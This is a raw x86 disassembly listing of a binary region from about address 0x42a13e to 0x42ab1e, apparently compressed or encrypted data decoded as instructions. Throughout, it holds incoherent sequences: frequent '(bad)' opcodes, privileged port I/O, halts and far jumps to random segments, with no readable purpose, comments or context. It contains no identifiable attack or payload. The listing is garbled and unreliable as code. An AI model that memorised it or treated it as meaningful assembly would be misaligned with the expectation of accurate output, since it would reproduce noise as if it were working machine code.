  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	in     al,0x5a
  42a142:	inc    esi
  42a143:	hlt    
  42a144:	mov    eax,0xf60001be
  42a149:	add    BYTE PTR [eax],al
  42a14b:	add    BYTE PTR [eax+eax*2-0x1fc29d16],dh
  42a152:	int3   
  42a153:	mov    eax,ds:0x441d6bee
  42a158:	jg     0x42a0e1
  42a15a:	push   eax
  42a15b:	inc    BYTE PTR [ebx-0x2f4c9d0f]
  42a161:	icebp  
  42a162:	and    ch,BYTE PTR [edx-0x43c3f1d2]
  42a168:	add    edi,DWORD PTR ds:0x8913087f
  42a16e:	outs   dx,DWORD PTR ds:[esi]
  42a16f:	pop    eax
  42a170:	mov    al,ds:0xadbcc676
  42a175:	data16 out dx,al
  42a177:	pop    DWORD PTR [ebx-0x4b]
  42a17a:	mov    edx,0xd22607c1
  42a17f:	ret    0x7bd7
  42a182:	dec    esi
  42a183:	add    al,0xcf
  42a185:	and    al,0x8e
  42a187:	stos   DWORD PTR es:[edi],eax
  42a188:	or     DWORD PTR ds:0x506fe9a9,ecx
  42a18e:	sbb    BYTE PTR [esi],dl
  42a190:	imul   eax,DWORD PTR [eax],0x68fe430c
  42a196:	loopne 0x42a20a
  42a198:	sub    BYTE PTR [ebx-0x754b5a18],bl
  42a19e:	ds jle 0x42a1b4
  42a1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a1a2:	ficom  WORD PTR [ebx+0x67ab4f61]
  42a1a8:	fcomp  DWORD PTR gs:[ebp+0x13]
  42a1ac:	adc    eax,0x8ae4124e
  42a1b1:	(bad)  
  42a1b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a1b4:	pop    ebp
  42a1b5:	add    bh,BYTE PTR [eax+ebp*4+0x45]
  42a1b9:	ins    BYTE PTR es:[edi],dx
  42a1ba:	es (bad) 
  42a1bc:	iret   
  42a1bd:	mov    cl,0xd6
  42a1bf:	and    BYTE PTR [ebp+esi*2+0xf],bh
  42a1c3:	or     dl,dh
  42a1c5:	fdivr  st,st(2)
  42a1c7:	jno    0x42a196
  42a1c9:	fisubr DWORD PTR [esi+0x24e45a5c]
  42a1cf:	inc    ebx
  42a1d0:	or     al,0xd5
  42a1d2:	outs   dx,BYTE PTR ds:[esi]
  42a1d3:	cmp    esi,DWORD PTR [ebx-0x14]
  42a1d6:	(bad)  
  42a1d8:	jbe    0x42a209
  42a1da:	push   esp
  42a1db:	pushaw 
  42a1dd:	add    dl,BYTE PTR [ecx+0x3123f968]
  42a1e3:	push   esi
  42a1e4:	fld    TBYTE PTR [ebx+eax*2-0x185c1f63]
  42a1eb:	xchg   edx,eax
  42a1ec:	std    
  42a1ed:	std    
  42a1ee:	in     eax,dx
  42a1ef:	push   edx
  42a1f0:	mov    ebx,0x47af63f4
  42a1f5:	hlt    
  42a1f6:	or     DWORD PTR [ebp-0x1d],ecx
  42a1f9:	sti    
  42a1fa:	xlat   BYTE PTR ds:[ebx]
  42a1fb:	add    bh,BYTE PTR [ebx+ecx*1-0x3c]
  42a1ff:	or     DWORD PTR [edi],ebp
  42a201:	push   ss
  42a202:	inc    ebp
  42a203:	lods   eax,DWORD PTR ds:[esi]
  42a204:	(bad)  
  42a205:	push   es
  42a206:	sub    eax,0xe84e7da5
  42a20b:	jnp    0x42a26e
  42a20d:	stos   DWORD PTR es:[edi],eax
  42a20e:	jge    0x42a1e5
  42a210:	push   esi
  42a211:	call   0x725:0xb63c00d8
  42a218:	push   esp
  42a219:	sub    ebp,DWORD PTR [ebp-0x19]
  42a21c:	mov    bl,0xb
  42a21e:	mov    edi,DWORD PTR [ecx-0x1a]
  42a221:	hlt    
  42a222:	in     al,dx
  42a223:	inc    eax
  42a224:	retf   0x4325
  42a227:	or     BYTE PTR [ebp-0x13],0x39
  42a22b:	ret    0x4edb
  42a22e:	and    BYTE PTR [edx+0xa],0x70
  42a232:	stos   DWORD PTR es:[edi],eax
  42a233:	xchg   edi,eax
  42a234:	or     ch,BYTE PTR [edi]
  42a236:	xchg   ebp,eax
  42a237:	sbb    ecx,edi
  42a239:	das    
  42a23a:	out    0x66,eax
  42a23c:	adc    dl,al
  42a23e:	jmp    0x42a1ec
  42a240:	pop    ebp
  42a241:	xor    DWORD PTR [eax],eax
	...
  42a2b3:	add    al,dh
  42a2b5:	adc    al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0x2c7f8ab9
  42a2c1:	inc    ebx
  42a2c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2c3:	add    BYTE PTR [esi-0x9fffe41],ch
  42a2c9:	add    BYTE PTR [eax],al
  42a2cb:	add    BYTE PTR [ebx],cl
  42a2cd:	inc    ecx
  42a2ce:	or     al,0x6b
  42a2d0:	mov    DWORD PTR [esi-0x30],0x895bef95
  42a2d7:	mov    esi,DWORD PTR [edi-0x4b]
  42a2da:	(bad)  
  42a2db:	fsub   QWORD PTR [edi-0x8]
  42a2de:	sar    dl,1
  42a2e0:	das    
  42a2e1:	test   BYTE PTR [esi-0x2453402e],ch
  42a2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2e8:	pop    ss
  42a2e9:	cmc    
  42a2ea:	ror    DWORD PTR [ecx-0x1a040c6a],0x73
  42a2f1:	retf   
  42a2f2:	bound  ebp,QWORD PTR [edx+0x8]
  42a2f5:	mov    ah,0x67
  42a2f7:	scas   al,BYTE PTR es:[edi]
  42a2f8:	xor    BYTE PTR [ebp-0x2f],cl
  42a2fb:	jbe    0x42a29e
  42a2fd:	mov    ds:0x2b007e12,eax
  42a302:	(bad)  
  42a303:	das    
  42a304:	aas    
  42a305:	test   BYTE PTR [edi],bh
  42a307:	sub    BYTE PTR [esi-0x71882c2a],dl
  42a30d:	mov    ?,WORD PTR [edx]
  42a30f:	in     al,0x92
  42a311:	or     DWORD PTR [edx+0x795e0740],esp
  42a317:	add    DWORD PTR [edi+0x19],0xbd74c8bd
  42a31e:	add    DWORD PTR es:[esi],esp
  42a321:	sub    al,0x37
  42a323:	inc    edx
  42a324:	sub    al,0xc9
  42a326:	pop    ecx
  42a327:	(bad)  
  42a329:	(bad)  
  42a32b:	lds    esi,FWORD PTR [eax]
  42a32d:	inc    eax
  42a32e:	push   cs
  42a32f:	cmp    BYTE PTR ds:0x1bef2323,ch
  42a335:	sub    BYTE PTR [ebx+eiz*1-0x516837c6],ah
  42a33c:	mov    ds:0x7d69f7da,eax
  42a341:	sub    dl,BYTE PTR [esi-0x36388a1f]
  42a347:	add    ecx,esi
  42a349:	pusha  
  42a34a:	xchg   edx,eax
  42a34b:	xor    esp,DWORD PTR [ebx-0x22]
  42a34e:	adc    DWORD PTR [edx],ebx
  42a350:	xchg   BYTE PTR [ecx-0x4f08ace1],bl
  42a356:	push   edi
  42a357:	dec    eax
  42a358:	cs push edi
  42a35a:	(bad)
  42a35d:	fisttp QWORD PTR [edi]
  42a35f:	shl    BYTE PTR [edx],1
  42a361:	push   ss
  42a362:	out    dx,eax
  42a363:	dec    edi
  42a364:	jmp    0xfd7d:0xf375d85d
  42a36b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a36c:	stos   BYTE PTR es:[edi],al
  42a36d:	cmp    DWORD PTR [esi],ebp
  42a36f:	or     ah,bh
  42a371:	push   ebp
  42a372:	lahf   
  42a373:	popa   
  42a374:	retf   
  42a375:	fst    QWORD PTR [edi]
  42a377:	lods   al,BYTE PTR ds:[esi]
  42a378:	xchg   esp,eax
  42a379:	ret    0xb584
  42a37c:	lock pushf 
  42a37e:	adc    al,0xfc
  42a380:	repz xlat BYTE PTR ds:[ebx]
  42a382:	imul   esi
  42a384:	iret   
  42a385:	ffreep st(7)
  42a387:	inc    ecx
  42a388:	ret    
  42a389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a38a:	(bad)  
  42a38b:	pop    edx
  42a38c:	or     cl,BYTE PTR [ecx]
  42a38e:	repz gs pop eax
  42a391:	into   
  42a392:	adc    BYTE PTR [ecx+0x6e495bca],ah
  42a398:	adc    ebx,DWORD PTR [ecx+0x7ac4df56]
  42a39e:	jecxz  0x42a38b
  42a3a0:	and    dl,BYTE PTR [ecx-0xf250998]
  42a3a6:	adc    DWORD PTR [edi-0x798322e2],esi
  42a3ac:	add    BYTE PTR [edi],dh
  42a3ae:	mov    edx,0xd5302446
  42a3b3:	mov    ah,0xce
  42a3b5:	adc    BYTE PTR [edi+0x584d69ba],0x4e
  42a3bc:	mov    ebp,0xc2ae40a3
  42a3c1:	jno    0x42a3c3
	...
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a3cc
  42a441:	pop    esi
  42a442:	mov    bl,0xda
  42a444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a445:	rol    BYTE PTR [ecx],0x0
  42a448:	test   BYTE PTR [eax],0x0
  42a44b:	add    al,cl
  42a44d:	fsubr  DWORD PTR [edx+edx*2]
  42a450:	push   bp
  42a452:	(bad)  
  42a453:	cld    
  42a454:	rcl    al,1
  42a456:	mov    ds:0x6875677e,eax
  42a45b:	adc    DWORD PTR [edi+ebp*4],0x2415a932
  42a462:	pop    ds
  42a463:	stos   DWORD PTR es:[edi],eax
  42a464:	pop    esi
  42a465:	clc    
  42a466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a467:	mov    bl,0x39
  42a469:	stc    
  42a46a:	push   cs
  42a46b:	mov    eax,0x5775d2d4
  42a470:	cmp    eax,0xa5378359
  42a475:	jecxz  0x42a485
  42a477:	retf   
  42a478:	jge    0x42a499
  42a47a:	idiv   BYTE PTR [ebx+0x68]
  42a47d:	mov    BYTE PTR [ebp-0x9],cl
  42a480:	iret   
  42a481:	add    eax,0x656b8b7c
  42a486:	fdivp  st(5),st
  42a488:	mov    DWORD PTR [ebx+0x210c4f2d],edx
  42a48e:	ret    0xe2a3
  42a491:	cs xchg ebp,eax
  42a493:	mov    esi,0xb6fbfcd5
  42a498:	(bad)  [ebx-0x125de2ae]
  42a49e:	jmp    0x9928:0x88aebea9
  42a4a5:	aad    0x44
  42a4a7:	mov    cl,0xbc
  42a4a9:	add    DWORD PTR [edi-0x1d],0xd
  42a4ad:	fbstp  TBYTE PTR ds:0xf90023ef
  42a4b3:	pop    es
  42a4b4:	sub    BYTE PTR [eax+0x70],0x87
  42a4b8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4ba:	es push esp
  42a4bc:	shl    DWORD PTR [edi-0xd],1
  42a4bf:	mov    eax,0xb00fe51c
  42a4c4:	bound  eax,QWORD PTR [ecx-0x683b7850]
  42a4ca:	mov    al,0xc6
  42a4cc:	mov    dh,0x36
  42a4ce:	repz add al,0xc3
  42a4d1:	in     eax,0x7f
  42a4d3:	jle    0x42a4b2
  42a4d5:	mov    ds:0x35239004,eax
  42a4da:	xor    bl,BYTE PTR ds:[esi+ebx*1+0x58ac3784]
  42a4e2:	cmp    dh,ah
  42a4e4:	adc    eax,0xffffffe3
  42a4e7:	inc    ebp
  42a4e8:	mov    ?,WORD PTR [ebx+0x7f]
  42a4eb:	cmp    DWORD PTR [edx+0x57],eax
  42a4ee:	ins    BYTE PTR es:[edi],dx
  42a4ef:	ins    DWORD PTR es:[edi],dx
  42a4f0:	sbb    ecx,DWORD PTR [esi]
  42a4f2:	enter  0x21aa,0x84
  42a4f6:	pop    es
  42a4f7:	gs icebp 
  42a4f9:	add    al,0x42
  42a4fb:	push   ebx
  42a4fc:	xchg   esi,eax
  42a4fd:	popa   
  42a4fe:	inc    edi
  42a4ff:	and    eax,0x1e5a844a
  42a504:	xor    dl,cl
  42a506:	inc    esp
  42a507:	mov    esp,0xe88c4817
  42a50c:	pop    ebp
  42a50d:	nop
  42a50e:	rcr    BYTE PTR [edx-0x7e9ea76f],cl
  42a514:	pop    es
  42a515:	test   eax,0x283ec6e9
  42a51a:	retf   
  42a51b:	jbe    0x42a513
  42a51d:	sahf   
  42a51e:	in     al,dx
  42a51f:	aaa    
  42a520:	xor    BYTE PTR ds:0x8129d14b,ah
  42a526:	adc    al,0x4d
  42a528:	inc    eax
  42a529:	out    dx,eax
  42a52a:	ficomp DWORD PTR [edx+0xd39630d]
  42a530:	push   esi
  42a531:	test   al,0x33
  42a533:	rcl    BYTE PTR [eax+0x66fddd43],1
  42a539:	xor    ebx,DWORD PTR [edx+0x5eea8a0d]
  42a53f:	les    ebp,FWORD PTR [edi]
  42a541:	popf   
	...
  42a5b2:	add    BYTE PTR [eax],al
  42a5b4:	ins    DWORD PTR es:[edi],dx
  42a5b5:	sbb    eax,0xfbf6c0e6
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	push   ecx
  42a5c1:	mov    ds:0xc19a7f76,al
  42a5c6:	add    DWORD PTR [eax],eax
  42a5c8:	test   BYTE PTR [eax],0x0
  42a5cb:	add    ch,al
  42a5cd:	xor    ah,bh
  42a5cf:	enter  0x529c,0xf7
  42a5d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5d4:	cmp    eax,edx
  42a5d6:	fldcw  WORD PTR [ebx-0x70]
  42a5d9:	outs   dx,DWORD PTR ds:[esi]
  42a5da:	mov    ah,bl
  42a5dc:	mov    BYTE PTR ds:0xbc8f9d31,cl
  42a5e2:	lods   eax,DWORD PTR ds:[esi]
  42a5e3:	jns    0x42a5c3
  42a5e5:	cmp    eax,0xf54904a8
  42a5ea:	in     eax,dx
  42a5eb:	mov    dl,0xb4
  42a5ed:	lods   al,BYTE PTR ds:[esi]
  42a5ee:	xchg   BYTE PTR fs:[ecx+0x2f],bl
  42a5f2:	aaa    
  42a5f3:	pushf  
  42a5f4:	(bad)
  42a5f8:	popa   
  42a5f9:	outs   dx,BYTE PTR cs:[esi]
  42a5fb:	add    al,dl
  42a5fd:	das    
  42a5fe:	scas   eax,DWORD PTR es:[edi]
  42a5ff:	cwde   
  42a600:	adc    ebp,DWORD PTR [eax]
  42a602:	mov    edi,0xcc37cae7
  42a607:	pop    fs
  42a609:	icebp  
  42a60a:	or     eax,0x3d2da664
  42a60f:	jb     0x42a614
  42a611:	cmp    DWORD PTR [ebp+0x71],esi
  42a614:	xor    eax,0x9e13828e
  42a619:	loop   0x42a5a9
  42a61b:	xor    BYTE PTR [esi+0x3faecb9a],0xa4
  42a622:	cmc    
  42a623:	jl     0x42a5f5
  42a625:	mov    ds:0x2b1f28f,eax
  42a62a:	pusha  
  42a62b:	fist   WORD PTR [edi+0x16fb5515]
  42a631:	and    al,0x44
  42a633:	adc    ebp,DWORD PTR [esi]
  42a635:	mov    ebp,0x1a936b66
  42a63a:	pop    ds
  42a63b:	stos   BYTE PTR es:[edi],al
  42a63c:	cwde   
  42a63d:	aas    
  42a63e:	pop    ebp
  42a63f:	jle    0x42a604
  42a641:	pop    esi
  42a642:	loope  0x42a651
  42a644:	dec    esi
  42a645:	loope  0x42a6bb
  42a647:	aaa    
  42a648:	push   0x575234ad
  42a64d:	imul   ebx,DWORD PTR [eax-0x44d3e16e],0x2d3fed00
  42a657:	ins    BYTE PTR es:[edi],dx
  42a658:	mov    bl,BYTE PTR [ecx]
  42a65a:	aad    0xa6
  42a65c:	mov    al,ds:0x9b58fbe0
  42a661:	icebp  
  42a662:	shl    BYTE PTR [edi+0x4e],cl
  42a665:	mov    ds,WORD PTR [edx-0x7516f70b]
  42a66b:	dec    ebp
  42a66c:	mov    ecx,DWORD PTR [esp+ebp*4]
  42a66f:	out    0x55,al
  42a671:	sbb    al,0xf2
  42a673:	repnz sub cl,bl
  42a676:	test   BYTE PTR [esi+0x23cbd7f7],0x11
  42a67d:	(bad)  
  42a67f:	pusha  
  42a680:	arpl   si,di
  42a682:	mov    al,ds:0xa5da5eac
  42a687:	inc    ebx
  42a688:	mov    edi,0x79e9ab08
  42a68d:	mov    ch,0x8f
  42a68f:	cld    
  42a690:	xchg   esp,eax
  42a691:	xor    eax,0x580713c0
  42a696:	pop    eax
  42a697:	jg     0x42a68b
  42a699:	(bad)  
  42a69a:	stos   DWORD PTR es:[edi],eax
  42a69b:	shl    DWORD PTR [esi-0x2],cl
  42a69e:	aaa    
  42a69f:	mov    edi,0xbdc7b137
  42a6a4:	mov    esi,0xb17e8d72
  42a6a9:	imul   ebp,DWORD PTR [edx-0x78],0x9f702bb3
  42a6b0:	cld    
  42a6b1:	jp     0x42a727
  42a6b3:	pop    ebp
  42a6b4:	sub    al,0xe0
  42a6b6:	mov    WORD PTR [ecx+0x1eb63460],ss
  42a6bc:	cmp    eax,0x9c8ab49f
  42a6c1:	out    0x0,al
	...
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	xchg   ebx,eax
  42a741:	rep outs dx,BYTE PTR ds:[esi]
  42a743:	jge    0x42a6d5
  42a745:	ret    0x1
  42a748:	test   BYTE PTR [eax],0x0
  42a74b:	add    BYTE PTR [eax+0x33d3b97c],ch
  42a751:	iret   
  42a752:	dec    ebx
  42a753:	ret    
  42a754:	dec    ecx
  42a755:	sbb    eax,0xae9020f1
  42a75a:	dec    esi
  42a75b:	xchg   ebx,eax
  42a75c:	dec    eax
  42a75d:	sbb    al,0x62
  42a75f:	mov    edi,0x9352610
  42a764:	adc    cl,dh
  42a766:	ror    BYTE PTR ds:0x935a0fc4,cl
  42a76c:	pop    DWORD PTR [esi]
  42a76e:	iret   
  42a76f:	and    eax,0x6d4b7950
  42a774:	outs   dx,BYTE PTR ds:[esi]
  42a775:	(bad)  
  42a776:	gs pop ebx
  42a778:	jbe    0x42a7f9
  42a77a:	in     al,0x63
  42a77c:	adc    eax,0x1114a9fd
  42a781:	pusha  
  42a782:	test   eax,0xae197750
  42a787:	imul   esp,DWORD PTR [ecx-0x4d],0x1a
  42a78b:	test   al,0x42
  42a78d:	or     al,0x63
  42a78f:	sti    
  42a790:	jmp    0xc3bee2aa
  42a795:	outs   dx,BYTE PTR gs:[esi]
  42a797:	lods   eax,DWORD PTR ds:[esi]
  42a798:	lahf   
  42a799:	into   
  42a79a:	fisub  DWORD PTR [edi+edi*1+0x59]
  42a79e:	cwde   
  42a79f:	mov    al,0x86
  42a7a1:	mov    eax,0x4f559dd3
  42a7a6:	mov    WORD PTR [ebx],gs
  42a7a8:	cmp    BYTE PTR [edx-0x583ddb5f],dl
  42a7ae:	lds    ecx,FWORD PTR [ebx+ecx*2+0x62]
  42a7b2:	push   0x24
  42a7b4:	outs   dx,DWORD PTR ds:[esi]
  42a7b5:	push   edx
  42a7b6:	add    al,0x82
  42a7b8:	and    BYTE PTR [edi-0x17c0b798],0xc6
  42a7bf:	lods   al,BYTE PTR ds:[esi]
  42a7c0:	push   esi
  42a7c1:	inc    eax
  42a7c2:	add    al,0x3b
  42a7c4:	inc    ebp
  42a7c5:	and    ah,bl
  42a7c7:	inc    edx
  42a7c8:	js     0x42a809
  42a7ca:	mov    ah,0xec
  42a7cc:	mov    bh,0xb0
  42a7ce:	inc    ebp
  42a7cf:	sbb    bh,BYTE PTR [esi]
  42a7d1:	daa    
  42a7d2:	loop   0x42a83e
  42a7d4:	call   0x3f7e1ff7
  42a7d9:	(bad)  
  42a7da:	out    dx,al
  42a7db:	arpl   WORD PTR [esi-0x37],bp
  42a7de:	cmp    al,0x1b
  42a7e0:	mov    WORD PTR [edx-0x3c3c56da],?
  42a7e6:	jle    0x42a7d6
  42a7e8:	jbe    0x42a7e0
  42a7ea:	dec    ebp
  42a7eb:	mov    al,ds:0xc2cfa9ec
  42a7f0:	(bad)  
  42a7f1:	xchg   edi,eax
  42a7f2:	xchg   esp,eax
  42a7f3:	ins    DWORD PTR es:[edi],dx
  42a7f4:	jo     0x42a841
  42a7f6:	icebp  
  42a7f7:	mov    gs,WORD PTR [eax+0xc]
  42a7fa:	xchg   esp,eax
  42a7fb:	pop    ebx
  42a7fc:	push   ss
  42a7fd:	rcr    bl,cl
  42a7ff:	jae    0x42a86f
  42a801:	cli    
  42a802:	stc    
  42a803:	in     eax,0xf4
  42a805:	push   esp
  42a806:	jmp    edx
  42a808:	add    al,0xf8
  42a80a:	jp     0x42a818
  42a80c:	enter  0x74b8,0xa4
  42a810:	jp     0x42a80b
  42a812:	adc    dl,cl
  42a814:	call   FWORD PTR [edx-0x4848e0a4]
  42a81a:	dec    ecx
  42a81b:	shr    BYTE PTR gs:[edx+ebx*2],1
  42a81f:	xor    DWORD PTR [edi],ebp
  42a821:	into   
  42a822:	sub    BYTE PTR [esi+0x6a],0x5b
  42a826:	mov    ecx,ecx
  42a828:	xchg   esi,eax
  42a829:	push   ebp
  42a82a:	ins    DWORD PTR es:[edi],dx
  42a82b:	fcos   
  42a82d:	mov    ecx,0x77ad3400
  42a832:	jno    0x42a85f
  42a834:	lds    eax,FWORD PTR [eax-0x5f21708d]
  42a83a:	jmp    0x42a7d5
  42a83c:	cli    
  42a83d:	xchg   esp,eax
  42a83e:	out    0xa8,al
  42a840:	sub    al,0x1a
	...
  42a8b2:	add    BYTE PTR [eax],al
  42a8b4:	push   edi
  42a8b5:	push   0xdf7fdf64
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	xor    dl,BYTE PTR [ebx-0x3c790628]
  42a8c6:	add    DWORD PTR [eax],eax
  42a8c8:	test   BYTE PTR [eax],0x0
  42a8cb:	add    BYTE PTR [ecx-0x4eee56bc],cl
  42a8d1:	mov    cl,0xa
  42a8d3:	xchg   ebx,eax
  42a8d4:	xchg   edi,eax
  42a8d5:	je     0x42a91c
  42a8d7:	mov    al,ds:0xefddc4b5
  42a8dc:	outs   dx,BYTE PTR ds:[esi]
  42a8dd:	mov    esi,0xbe7e7e35
  42a8e2:	jl     0x42a918
  42a8e4:	dec    edi
  42a8e5:	pushf  
  42a8e6:	pusha  
  42a8e7:	inc    edi
  42a8e8:	enter  0x4eb3,0xff
  42a8ec:	pop    edi
  42a8ed:	pop    edi
  42a8ee:	xor    al,0xf1
  42a8f0:	iret   
  42a8f1:	outs   dx,DWORD PTR ds:[esi]
  42a8f2:	stos   DWORD PTR es:[edi],eax
  42a8f3:	mov    ecx,0xfc6664dc
  42a8f8:	stc    
  42a8f9:	in     al,dx
  42a8fa:	or     eax,0xfdbd30c5
  42a8ff:	pop    ebx
  42a900:	adc    ah,cl
  42a902:	xor    DWORD PTR ds:0x3e2a8b80,esp
  42a908:	cmp    BYTE PTR [edi-0x9],al
  42a90b:	rcl    al,1
  42a90d:	lahf   
  42a90e:	dec    eax
  42a90f:	cmp    cl,bl
  42a911:	fisttp DWORD PTR [ecx-0x72]
  42a914:	ret    
  42a915:	xchg   esi,eax
  42a916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a917:	sub    al,0x42
  42a919:	jb     0x42a8f7
  42a91b:	shl    DWORD PTR [ebx+eiz*8+0x51077d0f],1
  42a922:	xchg   esp,eax
  42a923:	ret    0xef85
  42a926:	and    ebp,0x6116a8b6
  42a92c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a92d:	jno    0x42a906
  42a92f:	repnz pop esi
  42a931:	fwait
  42a932:	sbb    DWORD PTR [ebp+edi*4-0x887e021],edi
  42a939:	mov    ebp,0xed466c81
  42a93e:	popf   
  42a93f:	push   0x7
  42a941:	aam    0x9a
  42a943:	enter  0x2624,0xfd
  42a947:	dec    esi
  42a948:	push   ebp
  42a949:	jecxz  0x42a917
  42a94b:	ja     0x42a99b
  42a94d:	pop    edi
  42a94e:	push   es
  42a94f:	test   eax,0x9092f85f
  42a954:	pusha  
  42a955:	dec    esp
  42a956:	adc    ch,ah
  42a958:	nop
  42a959:	fucom  st(6)
  42a95b:	neg    DWORD PTR [edi+0x11]
  42a95e:	loope  0x42a96b
  42a960:	test   al,0x9c
  42a962:	(bad)  
  42a963:	pop    ebp
  42a964:	xchg   esp,eax
  42a965:	rol    al,0xa0
  42a968:	add    DWORD PTR [edx-0x47],0xffffff94
  42a96c:	aaa    
  42a96d:	leave  
  42a96e:	cmp    al,BYTE PTR [esp+edi*8]
  42a971:	neg    DWORD PTR [edi]
  42a973:	xor    al,0xf6
  42a975:	pop    ss
  42a976:	mov    ebx,0xe2928ccd
  42a97b:	adc    dl,BYTE PTR [ecx-0x645e48c0]
  42a981:	inc    eax
  42a982:	jecxz  0x42a957
  42a984:	outs   dx,BYTE PTR ds:[esi]
  42a985:	fst    DWORD PTR [edx+esi*2+0x1229e848]
  42a98c:	and    al,0x85
  42a98e:	pop    esi
  42a990:	dec    ebx
  42a991:	xchg   ecx,ecx
  42a993:	lds    esi,FWORD PTR [edx+0x47]
  42a996:	enter  0xd937,0x43
  42a99a:	ret    
  42a99b:	mov    ah,0x86
  42a99d:	mov    DWORD PTR [eax-0x71],ebx
  42a9a0:	stos   DWORD PTR es:[edi],eax
  42a9a1:	aam    0x7f
  42a9a3:	loopne 0x42a99a
  42a9a5:	push   ebp
  42a9a6:	sub    al,0xed
  42a9a8:	mov    bl,BYTE PTR [eax+0x3bca7b6d]
  42a9ae:	xchg   ecx,eax
  42a9af:	push   ebp
  42a9b0:	add    esp,esp
  42a9b2:	mov    esi,0x5ee1bee0
  42a9b7:	inc    esp
  42a9b8:	jmp    0x42a9e9
  42a9ba:	or     BYTE PTR [edi+0x5f],bl
  42a9bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9be:	cmp    bh,BYTE PTR [eax-0x2c]
  42a9c1:	xor    eax,0x0
	...
  42aa32:	add    BYTE PTR [eax],al
  42aa34:	into   
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	dec    esi
  42aa41:	je     0x42aab5
  42aa43:	hlt    
  42aa44:	jl     0x42aa0a
  42aa46:	add    DWORD PTR [eax],eax
  42aa48:	test   BYTE PTR [eax],0x0
  42aa4b:	add    BYTE PTR [edx],dh
  42aa4d:	mov    dl,0xe3
  42aa4f:	sub    eax,0x80e7e7e2
  42aa54:	mov    ebp,0xcf43aa62
  42aa59:	test   DWORD PTR [ebx+0x10597ffa],ebx
  42aa5f:	fistp  DWORD PTR [eax-0x3537353a]
  42aa65:	out    0x2f,al
  42aa67:	jnp    0x42aa32
  42aa69:	fwait
  42aa6a:	lahf   
  42aa6b:	lea    edi,[ebp-0x73]
  42aa6e:	fdiv   QWORD PTR [ecx]
  42aa70:	mov    dl,0x48
  42aa72:	push   ss
  42aa73:	adc    dl,BYTE PTR [esp+esi*4+0x10]
  42aa77:	lea    ebx,[edx-0x15]
  42aa7a:	adc    eax,0x730078fb
  42aa7f:	aam    0x16
  42aa81:	pop    ss
  42aa82:	fdiv   DWORD PTR [esi-0x1c5a2e08]
  42aa88:	test   DWORD PTR [edx+eax*1-0x6a],eax
  42aa8c:	sahf   
  42aa8d:	out    0x5a,al
  42aa8f:	sti    
  42aa90:	mov    bl,0x2e
  42aa92:	sbb    eax,0xa0a962eb
  42aa97:	add    BYTE PTR [ebx-0x7d408f6c],0x4e
  42aa9e:	lea    ebx,[edx-0x3f7f0472]
  42aaa4:	mov    cl,0xf
  42aaa6:	push   ds
  42aaa7:	add    edx,DWORD PTR [ebx+0x5e]
  42aaaa:	repnz lods eax,DWORD PTR ds:[esi]
  42aaac:	std    
  42aaad:	sub    BYTE PTR [esi+0x44],ch
  42aab0:	xchg   BYTE PTR [edx-0x26a90e57],bl
  42aab6:	pop    ss
  42aab7:	push   edx
  42aab8:	div    esp
  42aaba:	aas    
  42aabb:	fdiv   DWORD PTR [ebx-0x389492de]
  42aac1:	and    edx,0xc8b079f5
  42aac7:	push   cs
  42aac8:	push   ecx
  42aac9:	sbb    DWORD PTR [ecx+edi*4],edx
  42aacc:	pusha  
  42aacd:	ret    
  42aace:	push   cs
  42aacf:	push   ds
  42aad0:	mov    dl,0x80
  42aad2:	cdq    
  42aad3:	out    dx,al
  42aad4:	ret    
  42aad5:	les    edi,FWORD PTR [ebx+0x30c74d09]
  42aadb:	adc    BYTE PTR [ebx-0x5c],dl
  42aade:	xor    dh,bl
  42aae0:	(bad)  
  42aae1:	retf   
  42aae2:	(bad)
  42aae5:	pusha  
  42aae6:	adc    eax,0x338db9d8
  42aaeb:	inc    eax
  42aaec:	xor    ebx,ebp
  42aaee:	lods   al,BYTE PTR ds:[esi]
  42aaef:	inc    edx
  42aaf0:	scas   eax,DWORD PTR es:[edi]
  42aaf1:	jbe    0x42ab2c
  42aaf3:	push   ebx
  42aaf4:	mov    ch,0xa6
  42aaf6:	loopne 0x42ab34
  42aaf8:	add    ebp,DWORD PTR [edx-0x1ac3716]
  42aafe:	icebp  
  42aaff:	cmp    ebp,ecx
  42ab01:	mov    ebp,gs
  42ab03:	fucomi st,st(3)
  42ab05:	jmp    0x64a42e08
  42ab0a:	test   al,0x58
  42ab0c:	int3   
  42ab0d:	adc    DWORD PTR [ecx+0x37],esi
  42ab10:	sbb    BYTE PTR [edi+0x71d950ad],bh
  42ab16:	and    al,0x23
  42ab18:	mov    al,0x91
  42ab1a:	popa   
  42ab1b:	push   ebx
  42ab1c:	mov    bh,0x9f
  42ab1e:	clc    
